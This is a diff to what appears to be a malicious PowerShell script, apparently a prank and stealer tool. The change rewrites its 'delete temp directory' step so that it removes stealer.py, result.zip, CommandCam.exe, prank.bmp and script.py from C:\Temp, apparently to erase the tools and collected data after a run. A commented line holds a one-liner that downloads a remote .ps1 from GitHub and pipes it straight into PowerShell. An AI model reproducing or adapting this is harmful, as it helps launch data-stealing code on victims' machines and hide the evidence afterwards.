@@ -91,7 +91,11 @@ public class Wallpaper {
 
 # 8. Delete temp directory contetns
 # Remove-Item -Force -Recurse C:\Temp\*
-Start-Process -Wait Remove-Item -ArgumentList "-Force -Recurse C:\Temp\*"
-
+# Start-Process -Wait Remove-Item -ArgumentList "-Force -Recurse C:\Temp\*"
+Remove-Item C:\Temp\result.zip 
+Remove-Item C:\Temp\stealer.py 
+Remove-Item C:\Temp\prank.bmp 
+Remove-Item C:\Temp\CommandCam.exe 
+Remove-Item C:\Temp\script.py
 
 # powershell -NoExit -command "Invoke-WebRequest -Uri 'https://github.com/availableusername0/demo/raw/refs/heads/main/demo.ps1' -UseBasicParsing | Select-Object -ExpandProperty Content | powershell -command -"
